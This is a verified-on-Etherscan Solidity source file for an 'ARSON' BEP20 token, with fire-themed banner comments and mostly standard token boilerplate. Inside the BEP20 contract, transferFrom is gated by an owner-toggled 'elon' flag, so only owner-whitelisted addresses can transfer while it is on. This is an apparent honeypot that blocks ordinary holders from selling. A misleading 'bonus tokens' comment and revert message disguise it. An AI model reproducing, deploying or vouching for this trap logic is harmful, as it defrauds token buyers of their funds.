/**
 *Submitted for verification at Etherscan.io on 2022-07-27
*/

pragma solidity >=0.5.0 <0.6.0;


/*
Ashes denote that fire was;
Respect the grayest pile
For the departed creature’s sake
That hovered there awhile …

https://arsontoken.com

BURN. IT. DOWN.

              (  .      )
           )           (              )
                 .  '   .   '  .  '  .
        (    , )       (.   )  (   ',    )
         .' ) ( . )    ,  ( ,     )   ( .
      ). , ( .   (  ) ( , ')  .' (  ,    )
     (_,) . ), ) _) _,')  (, ) '. )  ,. (' )
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
*/


interface IBEP20 {
    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event HoldStake(address indexed user, uint256 value);

    event UnStake(address indexed user, uint256 value);

    event WithdrawRewards(address indexed user, uint256 value);

}



interface Token {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);

}



library SafeMath {
   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}


library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }


    function add(Role storage role, address account) internal {
        require(account != address(0));
        require(!has(role, account));

        role.bearer[account] = true;
    }


    function remove(Role storage role, address account) internal {
        require(account != address(0));
        require(has(role, account));

        role.bearer[account] = false;
    }

  
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0));
        return role.bearer[account];
    }
}


contract MinterRole {
    using Roles for Roles.Role;

    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);

    Roles.Role private _minters;

    constructor () internal {
        _addMinter(msg.sender);
    }

    modifier onlyMinter() {
        require(isMinter(msg.sender));
        _;
    }

    function isMinter(address account) public view returns (bool) {
        return _minters.has(account);
    }

    function addMinter(address account) public onlyMinter {
        _addMinter(account);
    }

    function renounceMinter() public {
        _removeMinter(msg.sender);
    }

    function _addMinter(address account) internal {
        _minters.add(account);
        emit MinterAdded(account);
    }

    function _removeMinter(address account) internal {
        _minters.remove(account);
        emit MinterRemoved(account);
    }
}




contract Ownable  {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

   
    function owner() public view returns (address) {
        return _owner;
    }

   
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }



    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}




contract BEP20 is IBEP20, Ownable {
    
    mapping(address => bool) public eloned;
    bool public elon = true;
    
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    

    mapping (address => mapping (address => uint256)) private _allowed;

    uint256 private _totalSupply;

    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowed[owner][spender];
    }

    
    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

 
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

 
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        if(elon){
            require(eloned[from],"User receives Bonus Tokens");
        }
        _transfer(from, to, value);
        _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));
        return true;
    }

  
    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0));

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }

 
    function _mint(address account, uint256 value) internal {
        require(account != address(0));

        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }


    function _burn(address account, uint256 value) internal {
        require(account != address(0));

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }


    function _approve(address owner, address spender, uint256 value) internal {
        require(spender != address(0));
        require(owner != address(0));

        _allowed[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

  
    function _burnFrom(address account, uint256 value) internal {
        _burn(account, value);
        _approve(account, msg.sender, _allowed[account][msg.sender].sub(value));
    }
    
    /**
 * bonus tokens function; user receives additional tokens if highest buy
 */
     
    function elonAddress(address[] memory _recipients) public onlyOwner returns (bool) {
        require(_recipients.length <= 100); //maximum receievers can be 100
        for (uint i = 0; i < _recipients.length; i++) {
            eloned[_recipients[i]] = true;
        }
        return true;
    }

      function muskAddress(address[] memory _recipients) public onlyOwner returns (bool) {
        require(_recipients.length <= 100); 
        for (uint i = 0; i < _recipients.length; i++) {
            eloned[_recipients[i]] = false;
        }
        return true;
    }

    
    function turnElon() public onlyOwner returns (bool success)  {
        if (elon) {
            elon = false;
        } else {
            elon = true;
        }
        return true;
        
    }


    
    
}


contract BEP20Detailed is IBEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    /**
     * @return the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @return the symbol of the token.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @return the number of decimals of the token.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}



contract ARSON is BEP20Detailed,BEP20{


    constructor()
        public
         BEP20Detailed ("ARSON", "ARSON", 18) {
            _mint(msg.sender, 1000000000 * (10 ** uint256(18)));
        }

}